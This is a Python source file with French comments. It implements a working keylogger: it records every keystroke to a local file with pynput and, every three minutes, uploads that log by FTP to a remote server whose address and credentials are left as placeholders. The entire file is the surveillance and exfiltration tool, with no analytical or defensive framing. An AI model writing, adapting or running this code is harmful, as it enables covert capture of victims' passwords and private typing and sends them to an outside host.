import threading
from pynput.keyboard import Listener
from ftplib import FTP
import schedule
import time
import os

# Fonction qui sera appelée à chaque frappe de touche
def on_press(key):
    try:
        # Enregistrement de la touche pressée dans un fichier texte
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}\n")
    except AttributeError:
        # En cas de touche spéciale (e.g. Shift, Ctrl, etc.)
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key}\n")

# Fonction pour démarrer l'écoute des frappes en tâche de fond
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Fonction pour envoyer le fichier via FTP et vérifier l'upload
def send_file_ftp(file_path):
    try:
        # Connexion FTP
        ftp = FTP()
        ftp.set_debuglevel(2)  # Augmente le niveau de débogage pour suivre le processus FTP
        print("Connexion au serveur FTP...")
        ftp.connect("YOUR IP ADRESS", 21)  # Remplacez par l'adresse IP et le port de votre serveur FTP
        ftp.login("user", "password")  # Remplacez par vos identifiants FTP
        print("Connexion réussie !")

        # Vérification si le fichier existe avant l'envoi
        print(f"Vérification de l'existence du fichier {file_path}...")
        if os.path.exists(file_path):
            print(f"Le fichier {file_path} existe.")
        else:
            print(f"Le fichier {file_path} n'existe pas.")
            return

        # Envoi du fichier
        with open(file_path, 'rb') as file:
            print(f"Envoi du fichier {file_path}...")
            ftp.storbinary(f"STOR {os.path.basename(file_path)}", file)
        print(f"Fichier {file_path} envoyé avec succès via FTP.")

        # Vérification de la présence du fichier sur le serveur FTP
        print("Vérification des fichiers présents sur le serveur FTP...")
        ftp.retrlines("LIST")  # Liste les fichiers dans le répertoire du serveur

        # Vérification du fichier spécifique sur le serveur
        print("Vérification de l'existence du fichier téléchargé sur le serveur...")
        files_on_server = ftp.nlst()  # Liste des fichiers présents sur le serveur
        if os.path.basename(file_path) in files_on_server:
            print(f"Le fichier {file_path} a été téléchargé avec succès sur le serveur.")
        else:
            print(f"Le fichier {file_path} n'a pas été trouvé sur le serveur FTP.")
        
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier FTP : {e}")
    finally:
        ftp.quit()

# Planification de l'envoi toutes les x minutes
def schedule_task():
    file_path = "key_log.txt"  # Le fichier de log à envoyer

    # Vérifier si le fichier existe avant de planifier l'envoi
    if os.path.exists(file_path):
        # Remplacez 3 par le nombre de minutes souhaité
        schedule.every(3).minutes.do(send_file_ftp, file_path=file_path)
    
    while True:
        schedule.run_pending()  # Vérifie et exécute les tâches programmées
        time.sleep(1)  # Pause d'une seconde pour ne pas surcharger le CPU

# Fonction principale qui va créer un thread pour écouter les frappes clavier
def main():
    # Démarrer un thread pour l'écoute des frappes clavier en tâche de fond
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True  # Le thread va s'arrêter automatiquement quand le programme principal se termine
    keylogger_thread.start()

    # Planification de l'envoi en arrière-plan
    schedule_task()

if __name__ == "__main__":
    main()
